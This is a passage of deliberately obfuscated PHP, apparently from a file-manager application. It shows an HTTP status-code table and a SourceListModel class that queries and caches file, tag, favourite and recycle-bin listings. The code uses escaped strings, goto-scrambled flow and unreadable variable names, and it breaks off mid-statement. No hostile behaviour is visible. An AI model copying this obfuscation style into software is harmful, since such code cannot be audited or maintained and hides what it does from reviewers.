"\x42\154\x6f\143\x6b\x65\144\40\142\x79\40\x57\151\156\x64\x6f\167\163\x20\x50\141\162\145\156\164\141\x6c\40\x43\x6f\156\164\x72\x6f\154\x73", "\64\65\x31" => "\125\156\141\166\141\x69\154\x61\x62\154\145\40\x46\x6f\x72\40\x4c\145\147\x61\x6c\40\x52\145\141\163\157\x6e\163", "\x34\71\64" => "\x52\x65\161\165\x65\x73\x74\40\110\x65\x61\x64\x65\162\40\x54\157\157\40\114\141\162\x67\145", "\x35\60\60" => "\111\156\164\x65\162\x6e\141\154\x20\123\x65\162\x76\x65\162\x20\105\x72\162\157\x72", "\65\x30\x31" => "\x4e\157\x74\40\111\x6d\160\x6c\145\x6d\145\x6e\x74\x65\x64", "\x35\60\62" => "\x42\x61\144\x20\107\x61\164\x65\167\141\x79", "\x35\60\63" => "\123\145\162\x76\x69\143\x65\40\x55\x6e\141\166\141\151\154\x61\x62\154\x65", "\65\x30\x34" => "\x47\x61\164\x65\167\x61\171\x20\124\x69\155\x65\x6f\x75\164", "\65\60\65" => "\x48\x54\x54\120\x20\x56\x65\162\163\151\157\x6e\x20\x6e\x6f\x74\40\163\165\160\x70\x6f\x72\x74\145\x64", "\x35\x30\67" => "\111\x6e\163\165\146\146\151\143\151\145\x6e\164\40\123\164\157\x72\141\x67\x65"); public static function code($dÕœ’—ÚÑ¬) { $EèÏ•‚ÜÏğ =& $_SERVER[Î¿—”òá]; $dÕœ’—ÚÑ¬ = $dÕœ’—ÚÑ¬ . $EèÏ•‚ÜÏğ[33]; $aöïÔÕÏõ = self::$statusCode[$dÕœ’—ÚÑ¬]; $aöïÔÕÏõ = $aöïÔÕÏõ ? "\x48\x54\x54\120\57\61\x2e\61\x20{$dÕœ’—ÚÑ¬}\x20" . $aöïÔÕÏõ : $EèÏ•‚ÜÏğ[33]; return $aöïÔÕÏõ; } } goto fœç¬òÅÜ•; b‡µÉÈÄñ: class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\x6f\165\162\x63\145"; protected $tableMeta = array("\x74\141\142\154\145\x4e\141\x6d\145" => "\x69\x6f\x5f\x73\x6f\165\162\x63\145\137\x6d\x65\x74\x61", "\x6d\145\164\x61\106\x69\145\154\144" => "\x73\x6f\x75\162\143\145\111\104"); protected $dataAuto = array(array("\155\x6f\144\x69\146\x79\124\151\x6d\x65", "\164\151\155\145", "\x69\x6e\x73\145\x72\x74", "\146\165\x6e\x63\x74\x69\x6f\x6e"), array("\143\x72\x65\x61\x74\x65\124\x69\x6d\145", "\x74\151\x6d\145", "\x69\156\163\145\162\164", "\x66\165\156\143\164\x69\x6f\x6e"), array("\x76\x69\x65\167\x54\151\155\145", "\x74\x69\155\145", "\x69\x6e\163\145\x72\164", "\146\165\x6e\x63\164\x69\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($AÑ‚Ê— ÀÕ) { return $this->listSource(array($_SERVER[Î¿—”òá][368] => $AÑ‚Ê— ÀÕ)); } public function typeName($AÌ½ŠÇİè) { static $e¯‘«ÅŸ›¾ = array(self::TYPE_SYSTEM => "\163\x79\x73\164\x65\x6d", self::TYPE_USER => "\x75\163\145\x72", self::TYPE_GROUP => "\147\x72\x6f\x75\x70"); return $e¯‘«ÅŸ›¾[$AÌ½ŠÇİè . $_SERVER[Î¿—”òá][33]]; } public function sourceListInfo($E‡íß—ÁÜÚ, $bâÜîŠåğØ = false) { goto aîí¦ï¬î½; C¯Ü”ÚÆ©: return array_to_keyvalue($Eô‹Òê›¿ô, $A‰Ì‹¹Ûƒ†[369]); goto Fö­Šè®ˆ‚; A·°ëĞ¹¼: if (!$E‡íß—ÁÜÚ) { return array(); } $Eô‹Òê›¿ô = $this->where(array($A‰Ì‹¹Ûƒ†[369] => array($A‰Ì‹¹Ûƒ†[7], $E‡íß—ÁÜÚ)))->select(); $this->_listDataApply($Eô‹Òê›¿ô, $bâÜîŠåğØ); goto C¯Ü”ÚÆ©; aîí¦ï¬î½: $A‰Ì‹¹Ûƒ† =& $_SERVER[Î¿—”òá]; $E‡íß—ÁÜÚ = $E‡íß—ÁÜÚ ? $E‡íß—ÁÜÚ : array(); $E‡íß—ÁÜÚ = array_filter(array_unique($E‡íß—ÁÜÚ)); goto A·°ëĞ¹¼; Fö­Šè®ˆ‚: } public function pathInfoFilter($e©ÑŸ·›ÃŒ) { goto E‘Ş¹ÖÈÇÆ; E‘Ş¹ÖÈÇÆ: $FªÄæà±£½ =& $_SERVER[Î¿—”òá]; $e©ÑŸ·›ÃŒ[$FªÄæà±£½[75]] = KodIO::make($e©ÑŸ·›ÃŒ[$FªÄæà±£½[369]]); $e©ÑŸ·›ÃŒ[$FªÄæà±£½[29]] = $e©ÑŸ·›ÃŒ[$FªÄæà±£½[370]] == 1 ? $FªÄæà±£½[76] : $FªÄæà±£½[167]; goto a¹ñ¢’ß—; a¹ñ¢’ß—: $e©ÑŸ·›ÃŒ[$FªÄæà±£½[371]] = $this->typeName($e©ÑŸ·›ÃŒ[$FªÄæà±£½[371]]); if ($e©ÑŸ·›ÃŒ[$FªÄæà±£½[370]] != 1) { $e©ÑŸ·›ÃŒ[$FªÄæà±£½[160]] = $e©ÑŸ·›ÃŒ[$FªÄæà±£½[372]]; unset($e©ÑŸ·›ÃŒ[$FªÄæà±£½[372]]); } $fÆİƒ‰Õ™ = $FªÄæà±£½[373]; goto cì£•äÓÇ‡; cì£•äÓÇ‡: $fÆİƒ‰Õ™ .= $FªÄæà±£½[374]; $fÆİƒ‰Õ™ .= $FªÄæà±£½[375]; $c–Òò™ œñ = explode($FªÄæà±£½[47], $fÆİƒ‰Õ™); goto c¨ç¥¼¸·; c¨ç¥¼¸·: if (isset($e©ÑŸ·›ÃŒ[$FªÄæà±£½[376]]) && $e©ÑŸ·›ÃŒ[$FªÄæà±£½[376]][$FªÄæà±£½[377]] == -1) { $c–Òò™ œñ = array_remove_value($c–Òò™ œñ, $FªÄæà±£½[187]); $c–Òò™ œñ = array_remove_value($c–Òò™ œñ, $FªÄæà±£½[107]); $c–Òò™ œñ = array_remove_value($c–Òò™ œñ, $FªÄæà±£½[378]); $c–Òò™ œñ = array_remove_value($c–Òò™ œñ, $FªÄæà±£½[379]); $c–Òò™ œñ = array_remove_value($c–Òò™ œñ, $FªÄæà±£½[77]); $c–Òò™ œñ = array_remove_value($c–Òò™ œñ, $FªÄæà±£½[380]); } $e©ÑŸ·›ÃŒ = array_field_key($e©ÑŸ·›ÃŒ, $c–Òò™ œñ); return $e©ÑŸ·›ÃŒ; goto Dç·éé¾ø; Dç·éé¾ø: } public function listUserFav() { goto d…í÷ÓÔ; D—ÍâÖŞğò: foreach ($A‚ ™Ú„ÀÕ as &$c©áŒœìì›) { $c©áŒœìì› = array($C¨½µËÃ°Ê[385] => $c©áŒœìì›[$C¨½µËÃ°Ê[367]], $C¨½µËÃ°Ê[386] => $c©áŒœìì›[$C¨½µËÃ°Ê[28]], $C¨½µËÃ°Ê[387] => $c©áŒœìì›[$C¨½µËÃ°Ê[75]], $C¨½µËÃ°Ê[388] => $c©áŒœìì›[$C¨½µËÃ°Ê[29]], $C¨½µËÃ°Ê[389] => $c©áŒœìì›[$C¨½µËÃ°Ê[187]], $C¨½µËÃ°Ê[390] => $c©áŒœìì›[$C¨½µËÃ°Ê[107]]); if ($c©áŒœìì›[$C¨½µËÃ°Ê[29]] == $C¨½µËÃ°Ê[382] && $DŠªÏ³àñ[$c©áŒœìì›[$C¨½µËÃ°Ê[75]]]) { $c©áŒœìì›[$C¨½µËÃ°Ê[391]] = $DŠªÏ³àñ[$c©áŒœìì›[$C¨½µËÃ°Ê[75]]]; } } return $A‚ ™Ú„ÀÕ; goto eš‹»Ñ®¢Ú; fİŸ—ãƒÚ—: $d¦ä˜ê¹÷¢ = array_to_keyvalue($d¦ä˜ê¹÷¢, $C¨½µËÃ°Ê[33], $C¨½µËÃ°Ê[75]); if ($d¦ä˜ê¹÷¢) { $DŠªÏ³àñ = $this->listSource(array($C¨½µËÃ°Ê[383] => array($C¨½µËÃ°Ê[384], $d¦ä˜ê¹÷¢))); } $DŠªÏ³àñ = array_to_keyvalue($DŠªÏ³àñ[$C¨½µËÃ°Ê[354]], $C¨½µËÃ°Ê[369]); goto D—ÍâÖŞğò; d…í÷ÓÔ: $C¨½µËÃ°Ê =& $_SERVER[Î¿—”òá]; $A‚ ™Ú„ÀÕ = Model($C¨½µËÃ°Ê[381])->listData(); $d¦ä˜ê¹÷¢ = array_filter_by_field($A‚ ™Ú„ÀÕ, $C¨½µËÃ°Ê[29], $C¨½µËÃ°Ê[382]); goto fİŸ—ãƒÚ—; eš‹»Ñ®¢Ú: } public function listUserTag($dö…ãÚ½õ) { goto Cä°Úª¯; eŸ¶™¯‘: $EáÇ¢‚ùæ = array_to_keyvalue($EáÇ¢‚ùæ, $C„Ò»ƒ–Œâ[33], $C„Ò»ƒ–Œâ[75]); $fİ– ÙÔë = array(); if ($EáÇ¢‚ùæ) { $EÌÎªÖõ¯ = array($C„Ò»ƒ–Œâ[383] => array($C„Ò»ƒ–Œâ[384], $EáÇ¢‚ùæ)); $fİ– ÙÔë = $this->listSource($EÌÎªÖõ¯); } goto cÃ’ë¤êğ; Cä°Úª¯: $C„Ò»ƒ–Œâ =& $_SERVER[Î¿—”òá]; $DŞºç áğ = Model($C„Ò»ƒ–Œâ[392])->listData(); $EáÇ¢‚ùæ = array_filter_by_field($DŞºç áğ, $C„Ò»ƒ–Œâ[393], $dö…ãÚ½õ); goto eŸ¶™¯‘; cÃ’ë¤êğ: $this->listUserTagClear($EáÇ¢‚ùæ, $fİ– ÙÔë, $dö…ãÚ½õ); return $fİ– ÙÔë; goto fäÂËÄåØÇ; fäÂËÄåØÇ: } private function listUserTagClear($e™µÑ‹Ñù, $bá¡šÏÕ•, $aãùæİğÎ¦) { goto d˜ÀÓ°È½; bí¡„®í‰î: $B«Âªœ÷ê™ = array_merge($AÌêÒ…„¦®, $EÛ–¿¤ÉŒÉ); foreach ($e™µÑ‹Ñù as $b†è¨‚àã¼) { if (!in_array($b†è¨‚àã¼, $B«Âªœ÷ê™)) { $b…ˆñ×À‘[] = $b†è¨‚àã¼; } } if (!$b…ˆñ×À‘) { return; } goto d³³ˆ×«â; d˜ÀÓ°È½: $BŠëİĞÔ¡ =& $_SERVER[Î¿—”òá]; if (!$e™µÑ‹Ñù) { return; } if ($bá¡šÏÕ• && count($e™µÑ‹Ñù) == $bá¡šÏÕ•[$BŠëİĞÔ¡[351]][$BŠëİĞÔ¡[352]]) { return; } goto cÙ„õ µå; cÙ„õ µå: $b…ˆñ×À‘ = array(); $EÛ–¿¤ÉŒÉ = array_to_keyvalue($bá¡šÏÕ•[$BŠëİĞÔ¡[74]], $BŠëİĞÔ¡[33], $BŠëİĞÔ¡[369]); $AÌêÒ…„¦® = array_to_keyvalue($bá¡šÏÕ•[$BŠëİĞÔ¡[73]], $BŠëİĞÔ¡[33], $BŠëİĞÔ¡[369]); goto bí¡„®í‰î; d³³ˆ×«â: Model($BŠëİĞÔ¡[394])->removeFromTag($b…ˆñ×À‘, $aãùæİğÎ¦); goto F®¥Š»ºâÎ; F®¥Š»ºâÎ: } public function listUserRecycle() { $a•‰Ç¶’êä =& $_SERVER[Î¿—”òá]; $D»ƒ½Ñ‘å­ = Model($a•‰Ç¶’êä[395])->listData(); if (!$D»ƒ½Ñ‘å­) { return array(); } $Bô‚„Åî½ = array($a•‰Ç¶’êä[383] => array($a•‰Ç¶’êä[384], $D»ƒ½Ñ‘å­), $a•‰Ç¶’êä[396] => 1); return $this->listSource($Bô‚„Åî½); } public function listSource($BÇƒÙ¶ÕàÙ, $bŒ«ë¡˜¶ = 3000) { goto FÚ™ßò”ôŒ; FÚ™ßò”ôŒ: $f‡ß˜§‡ˆ“ =& $_SERVER[Î¿—”òá]; if (!isset($BÇƒÙ¶ÕàÙ[$f‡ß˜§‡ˆ“[397]])) { $BÇƒÙ¶ÕàÙ[$f‡ß˜§‡ˆ“[397]] = 0; } $E²ËĞİ–ÎÎ = $f‡ß˜§‡ˆ“[398]; goto FçŠÑ·¦õô; Cï²ƒ˜ˆÒ: return $DŒø¹íøö¾; goto bñ‰²ÊŠ; FçŠÑ·¦õô: $DŒø¹íøö¾ = $this->field($E²ËĞİ–ÎÎ)->_makeOrder()->where($BÇƒÙ¶ÕàÙ)->selectPage($bŒ«ë¡˜¶); $this->_listDataApply($DŒø¹íøö¾[$f‡ß˜§‡ˆ“[354]]); $this->_listMake($DŒø¹íøö¾); goto Cï²ƒ˜ˆÒ; bñ‰²ÊŠ: } protected function _makeOrder() { goto a½ª½êÌˆ†; bØíïÙô: if ($BÆ İ³îí× == $F¢­Ê×Œ—[28]) { } $B—‰çÍ†è¹ = $F¢­Ê×Œ—[409] . $FˆÇÄíÊ’[$BÆ İ³îí×] . $F¢­Ê×Œ—[50] . $eíí™‘¦”¯[$fÃœçõÆÉ¼]; return $this->order(rtrim(trim($B—‰çÍ†è¹), $F¢­Ê×Œ—[47])); goto bÉÁ›ÏØğİ; F¡ÙŒ”ƒİä: $eíí™‘¦”¯ = array($F¢­Ê×Œ—[402] => $F¢­Ê×Œ—[403], $F¢­Ê×Œ—[404] => $F¢­Ê×Œ—[405]); $FˆÇÄíÊ’ = array($F¢­Ê×Œ—[28] => $F¢­Ê×Œ—[28], $F¢­Ê×Œ—[77] => $F¢­Ê×Œ—[77], $F¢­Ê×Œ—[160] => $F¢­Ê×Œ—[372], $F¢­Ê×Œ—[378] => $F¢­Ê×Œ—[378], $F¢­Ê×Œ—[406] => $F¢­Ê×Œ—[379], $F¢­Ê×Œ—[187] => $F¢­Ê×Œ—[187], $F¢­Ê×Œ—[107] => $F¢­Ê×Œ—[107]); $BÆ İ³îí× = Input::get($F¢­Ê×Œ—[407], $F¢­Ê×Œ—[7], $DïÌ¿ÛÈå¯, array_keys($FˆÇÄíÊ’)); goto AŞ‡âØ«Ñ†; a½ª½êÌˆ†: $F¢­Ê×Œ— =& $_SERVER[Î¿—”òá]; $DïÌ¿ÛÈå¯ = Model($F¢­Ê×Œ—[399])->get($F¢­Ê×Œ—[400]); $bíšÖ¯§‰ß = Model($F¢­Ê×Œ—[399])->get($F¢­Ê×Œ—[401]); goto F¡ÙŒ”ƒİä; AŞ‡âØ«Ñ†: $fÃœçõÆÉ¼ = Input::get($F¢­Ê×Œ—[408], $F¢­Ê×Œ—[7], $bíšÖ¯§‰ß, array_keys($eíí™‘¦”¯)); if (!in_array($BÆ İ³îí×, array_keys($FˆÇÄíÊ’))) { $BÆ İ³îí× = $F¢­Ê×Œ—[28]; } if (!in_array($fÃœçõÆÉ¼, array_keys($eíí™‘¦”¯))) { $BÆ İ³îí× = $F¢­Ê×Œ—[402]; } goto bØíïÙô; bÉÁ›ÏØğİ: } protected function _listDataApplyItem($EšÀ–ğœŒõ, $f™ä£¦åê = false) { $DìİŸƒ¦¦ = array($EšÀ–ğœŒõ); $this->_listDataApply($DìİŸƒ¦¦, $f™ä£¦åê); return $DìİŸƒ¦¦[0]; } protected function _listDataApply(&$b‘Ï†Ğ…ºÈ, $a±È¬‰âŸ = false) { goto dßå•øğ»§; dßå•øğ»§: $eÑ¢¢ØÄ§Ä =& $_SERVER[Î¿—”òá]; if (!$b‘Ï†Ğ…ºÈ) { $b‘Ï†Ğ…ºÈ = array(); return; } $f³¨¦ê¢… = array_to_keyvalue($b‘Ï†Ğ…ºÈ, $eÑ¢¢ØÄ§Ä[33], $eÑ¢¢ØÄ§Ä[369]); goto B½ááÈ¬Î; B½ááÈ¬Î: $f³¨¦ê¢… = array_unique($f³¨¦ê¢…); $this->_listSourceCache($b‘Ï†Ğ…ºÈ); if (!$a±È¬‰âŸ) { $this->_listAppendMeta($b‘Ï†Ğ…ºÈ, $f³¨¦ê¢…); $this->_listAppendFileMeta($b‘Ï†Ğ…ºÈ, $f³¨¦ê¢…); $this->_listAppendChildren($b‘Ï†Ğ…ºÈ, $f³¨¦ê¢…); } goto eŒÄ…Ï³ÎÍ; fïöºÛøîº: $this->_listAppendUser($b‘Ï†Ğ…ºÈ); $this->_listFilterInfo($b‘Ï†Ğ…ºÈ, $a±È¬‰âŸ); goto CÈ•¢é¢Èí; eŒÄ…Ï³ÎÍ: $this->_listAppendPath($b‘Ï†Ğ…ºÈ); $this->_listAppendAuth($b‘Ï†Ğ…ºÈ); $this->_listAppendSourceInfo($b‘Ï†Ğ…ºÈ, $f³¨¦ê¢…); goto fïöºÛøîº; CÈ•¢é¢Èí: } protected function _listSourceCache($C½„à¥“‰) { $C‹ÙÎ›Í£  =& $_SERVER[Î¿—”òá]; foreach ($C½„à¥“‰ as $aîöƒŸÛÈ–) { self::$cacheSourceInfo[$C‹ÙÎ›Í£ [410] . $aîöƒŸÛÈ–[$C‹ÙÎ›Í£ [369]]] = $aîöƒŸÛÈ–; } } protected function _listFilterInfo(&$f¥•‚–™¸, $ašº—«Š = false) { $F’ß¤ËÀÛ =& $_SERVER[Î¿—”òá]; foreach ($f¥•‚–™¸ as &$AŠ½¶•Ù) { $AŠ½¶•Ù = $this->pathInfoFilter($AŠ½¶•Ù); self::$cachePathInfo[$F’ß¤ËÀÛ[411] . intval($ašº—«Š) . $F’ß¤ËÀÛ[412] . $AŠ½¶•Ù[$F’ß¤ËÀÛ[369]]] = $AŠ½¶•Ù; } } protected function _listMake(&$E±ßŒ´ôÕè) { $bã›Š›ç˜ï =& $_SERVER[Î¿—”òá]; $E±ßŒ´ôÕè[$bã›Š›ç˜ï[74]] = array(); $E±ßŒ´ôÕè[$bã›Š›ç˜ï[73]] = array(); foreach ($E±ßŒ´ôÕè[$bã›Š›ç˜ï[354]] as $BôƒÚÎ²šÇ) { $d½ğ±…Â‹ = $BôƒÚÎ²šÇ[$bã›Š›ç˜ï[370]] == 1 ? $bã›Š›ç˜ï[74] : $bã›Š›ç˜ï[73]; $E±ßŒ´ôÕè[$d½ğ±…Â‹][] = $BôƒÚÎ²šÇ; } unset($E±ßŒ´ôÕè[$bã›Š›ç˜ï[354]]); } protected function _listAppendMeta(&$fÔëÛ·âÂ, $f›Ú±Ğ»µ) { goto d§‰ÕŸêö§; CÊ¢óâ§¥: foreach ($bîÓ…äµÆñ as $C°£‹èƒà„) { if (!isset($f§ŠÁ±”â¼[$C°£‹èƒà„[$c•Í¢¥ƒ»é[369]]])) { $f§ŠÁ±”â¼[$C°£‹èƒà„[$c•Í¢¥ƒ»é[369]]] = array(); } if (in_array($C°£‹èƒà„[$c•Í¢¥ƒ»é[89]], $FìÄ©‡¥Ç)) { continue; } $f§ŠÁ±”â¼[$C°£‹èƒà„[$c•Í¢¥ƒ»é[369]]][$C°£‹èƒà„[$c•Í¢¥ƒ»é[89]]] = $C°£‹èƒà„[$c•Í¢¥ƒ»é[359]]; } foreach ($fÔëÛ·âÂ as &$Eß©ä‡°Ö÷) { $Eß©ä‡°Ö÷[$c•Í¢¥ƒ»é[417]] = !1; if (isset($f§ŠÁ±”â¼[$Eß©ä‡°Ö÷[$c•Í¢¥ƒ»é[369]]])) { $Eß©ä‡°Ö÷[$c•Í¢¥ƒ»é[417]] = $f§ŠÁ±”â¼[$Eß©ä‡°Ö÷[$c•Í¢¥ƒ»é[369]]]; } if ($this->fileIsLock($Eß©ä‡°Ö÷) && $Eß©ä‡°Ö÷[$c•Í¢¥ƒ»é[376]]) { $AÍŒš›ŒÕØ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $Eß©ä‡°Ö÷[$c•Í¢¥ƒ»é[376]][$c•Í¢¥ƒ»é[377]] = AuthModel::authDisable($Eß©ä‡°Ö÷[$c•Í¢¥ƒ»é[376]][$c•Í¢¥ƒ»é[377]], $AÍŒš›ŒÕØ); $Eß©ä‡°Ö÷[$c•Í¢¥ƒ»é[376]][$c•Í¢¥ƒ»é[418]][$c•Í¢¥ƒ»é[376]] = $Eß©ä‡°Ö÷[$c•Í¢¥ƒ»é[376]][$c•Í¢¥ƒ»é[377]]; } } goto C£¯Š¼ªæÑ; d§‰ÕŸêö§: $c•Í¢¥ƒ»é =& $_SERVER[Î¿—”òá]; $fñ­ˆŞ = array($c•Í¢¥ƒ»é[383] => array($c•Í¢¥ƒ»é[384], $f›Ú±Ğ»µ)); $bîÓ…äµÆñ = Model($c•Í¢¥ƒ»é[413])->field($c•Í¢¥ƒ»é[414])->where($fñ­ˆŞ)->select(); goto e£òïµùÓØ; e£òïµùÓØ: if (!$bîÓ…äµÆñ) { return; } $FìÄ©‡¥Ç = array($c•Í¢¥ƒ»é[415], $c•Í¢¥ƒ»é[416]); $f§ŠÁ±”â¼ = array(); goto CÊ¢óâ§¥; C£¯Š¼ªæÑ: } protected function _listAppendFileMeta(&$BÓŞĞˆÄä, $eÉøİÇÀ½) { goto DÎ”Ğàóà±; BÚ’ÂÃê÷: $FøÀ÷ª‹Áğ = Model($dÊäƒ¨†ËŒ[422])->field($B“ôÖ½õÇÂ)->where($A’êğÑ¹ù“)->select(); $FøÀ÷ª‹Áğ = array_to_keyvalue($FøÀ÷ª‹Áğ, $dÊäƒ¨†ËŒ[419]); $DˆøğÂ½ä = Model($dÊäƒ¨†ËŒ[423])->field($dÊäƒ¨†ËŒ[424])->where($A’êğÑ¹ù“)->select(); goto eõó«´µŞç; Fš‚à„‹ØÃ: if (!$fšø‹¬ë†) { return; } $A’êğÑ¹ù“ = array($dÊäƒ¨†ËŒ[420] => array($dÊäƒ¨†ËŒ[384], $fšø‹¬ë†)); $B“ôÖ½õÇÂ = $dÊäƒ¨†ËŒ[421]; goto BÚ’ÂÃê÷; DÎ”Ğàóà±: $dÊäƒ¨†ËŒ =& $_SERVER[Î¿—”òá]; $fšø‹¬ë† = array_to_keyvalue($BÓŞĞˆÄä, $dÊäƒ¨†ËŒ[33], $dÊäƒ¨†ËŒ[419]); $fšø‹¬ë† = array_filter(array_unique($fšø‹¬ë†)); goto Fš‚à„‹ØÃ; eõó«´µŞç: $DˆøğÂ½ä = $DˆøğÂ½ä ? $DˆøğÂ½ä : array(); $a½´»œ…¯ñ = array(); foreach ($DˆøğÂ½ä as $EÁëˆõ—É) { if (!isset($a½´»œ…¯ñ[$EÁëˆõ—É[$dÊäƒ¨†ËŒ[419]]])) { $a½´»œ…¯ñ[$EÁëˆõ—É[$dÊäƒ¨†ËŒ[419]]] = array(); } $a½´»œ…¯ñ[$EÁëˆõ—É[$dÊäƒ¨†ËŒ[419]]][$EÁëˆõ—É[$dÊäƒ¨†ËŒ[89]]] = $EÁëˆõ—É[$dÊäƒ¨†ËŒ[359]]; } goto D¥‹¶ÀÎä; D¥‹¶ÀÎä: foreach ($BÓŞĞˆÄä as &$EÑö«¥âä) { goto b‘Ü¤ÁÅ›; EãÁàø™¸ê: unset($FøÀ÷ª‹Áğ[$Cìã´šËâ‰][$dÊäƒ¨†ËŒ[75]]); $BêóéïÛÁœ = is_array($a½´»œ…¯ñ[$Cìã´šËâ‰]) ? $a½´»œ…¯ñ[$Cìã´šËâ‰] : array(); $EÑö«¥âä[$dÊäƒ¨†ËŒ[162]] = array_merge($BêóéïÛÁœ, $FøÀ÷ª‹Áğ[$Cìã´šËâ‰]); goto cÑ¤ÖÄ¤‘; bĞ–®Šá: $Có»“ê°÷È[$dÊäƒ¨†ËŒ[77]] = $EÑö«¥âä[$dÊäƒ¨†ËŒ[77]]; $Có»“ê°÷È[$dÊäƒ¨†ËŒ[28]] = $EÑö«¥âä[$dÊäƒ¨†ËŒ[28]]; self::$cacheFileInfo[$dÊäƒ¨†ËŒ[425] . $Cìã´šËâ‰] = $Có»“ê°÷È; goto EãÁàø™¸ê; b‘Ü¤ÁÅ›: $Cìã´šËâ‰ = $EÑö«¥âä[$dÊäƒ¨†ËŒ[419]]; if (!$Cìã´šËâ‰ || !isset($FøÀ÷ª‹Áğ[$Cìã´šËâ‰])) { continue; } $Có»“ê°÷È = $FøÀ÷ª‹Áğ[$Cìã´šËâ‰]; goto bĞ–®Šá; cÑ¤ÖÄ¤‘: if (isset($EÑö«¥âä[$dÊäƒ¨†ËŒ[162]][$dÊäƒ¨†ËŒ[426]])) { $EÑö«¥âä[$dÊäƒ¨†ËŒ[426]] = json_decode($EÑö«¥âä[$dÊäƒ¨†ËŒ[162]][$dÊäƒ¨†ËŒ[426]], !0); unset($EÑö«¥âä[$dÊäƒ¨†ËŒ[162]][$dÊäƒ¨†ËŒ[426]]); } goto BÓÊ×©›·; BÓÊ×©›·: } goto E±†÷‡“‘Ô; E±†÷‡“‘Ô: } protected function _listAppendSourceInfo(&$Cˆâ©Êî»ó, $C‡­ÄÛ°ÜÃ) { goto EŠ¯Ñß³®; AéåÌ—Ï¯: $D‚æ¶÷®© = array_to_keyvalue($bÇ“‘÷ŞïÊ, $B®ÈôŸé»ó[367]); $eÊñ«¼×î = array_to_keyvalue_group($e»õ·¦ŠÍ¿, $B®ÈôŸé»ó[75], $B®ÈôŸé»ó[393]); $bÉÏ½Á—¸Ü = array_to_keyvalue($Eä›ª‡öÏ¨, $B®ÈôŸé»ó[75]); goto f‘ÜĞ…; E…­ùÎ­ó¢: $e»õ·¦ŠÍ¿ = Model($B®ÈôŸé»ó[392])->listData(); $Eä›ª‡öÏ¨ = Model($B®ÈôŸé»ó[381])->listData(); $CÜİÜ‘ğ›­ = Model($B®ÈôŸé»ó[429])->listSimple(); goto AéåÌ—Ï¯; EŠ¯Ñß³®: $B®ÈôŸé»ó =& $_SERVER[Î¿—”òá]; if (!defined($B®ÈôŸé»ó[427])) { return; } $bÇ“‘÷ŞïÊ = Model($B®ÈôŸé»ó[428])->listData(); goto E…­ùÎ­ó¢; f‘ÜĞ…: $b›‹Å«ÊŒ = array_to_keyvalue_group($CÜİÜ‘ğ›­, $B®ÈôŸé»ó[369]); foreach ($Cˆâ©Êî»ó as &$CŸèƒÌ†“É) { $CŸèƒÌ†“É[$B®ÈôŸé»ó[391]] = array($B®ÈôŸé»ó[430] => 0, $B®ÈôŸé»ó[431] => 0, $B®ÈôŸé»ó[432] => 0); if (isset($bÉÏ½Á—¸Ü[$CŸèƒÌ†“É[$B®ÈôŸé»ó[369]]])) { $CŸèƒÌ†“É[$B®ÈôŸé»ó[391]][$B®ÈôŸé»ó[433]] = 1; $CŸèƒÌ†“É[$B®ÈôŸé»ó[391]][$B®ÈôŸé»ó[434]] = $bÉÏ½Á—¸Ü[$CŸèƒÌ†“É[$B®ÈôŸé»ó[369]]][$B®ÈôŸé»ó[28]]; } if (isset($eÊñ«¼×î[$CŸèƒÌ†“É[$B®ÈôŸé»ó[369]]])) { $CŸèƒÌ†“É[$B®ÈôŸé»ó[391]][$B®ÈôŸé»ó[435]] = array(); foreach ($eÊñ«¼×î[$CŸèƒÌ†“É[$B®ÈôŸé»ó[369]]] as $b×©¥Çè¦‹) { $b¡ŠÂŒá›ƒ = $D‚æ¶÷®©[$b×©¥Çè¦‹]; $CŸèƒÌ†“É[$B®ÈôŸé»ó[391]][$B®ÈôŸé»ó[435]][] = array($B®ÈôŸé»ó[436] => $b¡ŠÂŒá›ƒ[$B®ÈôŸé»ó[367]], $B®ÈôŸé»ó[386] => $b¡ŠÂŒá›ƒ[$B®ÈôŸé»ó[28]], $B®ÈôŸé»ó[437] => $b¡ŠÂŒá›ƒ[$B®ÈôŸé»ó[438]]); } } if (isset($b›‹Å«ÊŒ[$CŸèƒÌ†“É[$B®ÈôŸé»ó[369]]])) { $CŸèƒÌ†“É[$B®ÈôŸé»ó[391]][$B®ÈôŸé»ó[439]] = array(); foreach ($b›‹Å«ÊŒ[$CŸèƒÌ†“É[$B®ÈôŸé»ó[369]]] as $fŠË—¾ø‹Ÿ) { $CŸèƒÌ†“É[$B®ÈôŸé»ó[391]][$B®ÈôŸé»ó[439]] = array($B®ÈôŸé»ó[440] => $fŠË—¾ø‹Ÿ[$B®ÈôŸé»ó[441]], $B®ÈôŸé»ó[442] => $fŠË—¾ø‹Ÿ[$B®ÈôŸé»ó[443]], $B®ÈôŸé»ó[444] => $fŠË—¾ø‹Ÿ[$B®ÈôŸé»ó[369]], $B®ÈôŸé»ó[445] => $fŠË—¾ø‹Ÿ[$B®ÈôŸé»ó[446]], $B®ÈôŸé»ó[447] => $fŠË—¾ø‹Ÿ[$B®ÈôŸé»ó[448]]); } } } return $Cˆâ©Êî»ó; goto B£•ãæö’„; B£•ãæö’„: } protected function _listAppendChildren(&$CÃßñ™æÀ, $EÜÑ®ğµ“ø) { goto Ağ¤‰­†Õ; EÙİ“ëĞæá: $F¢Æ¦Ñ©® = $this->tablePrefix . $this->tableName; for ($FŠ·„†õ…Â = 0; $FŠ·„†õ…Â < $dÏçëÈÄ¢İ; $FŠ·„†õ…Â++) { $bµ—†÷Ã×ç = intval($CÃßñ™æÀ[$FŠ·„†õ…Â][$e¯ì¼ªæÈ½[397]]); if ($CÃßñ™æÀ[$FŠ·„†õ…Â][$e¯ì¼ªæÈ½[370]]) { $bÉèÈ¶Í´ä = $CÃßñ™æÀ[$FŠ·„†õ…Â][$e¯ì¼ªæÈ½[369]]; $B´î¶«ÑåÑ .= 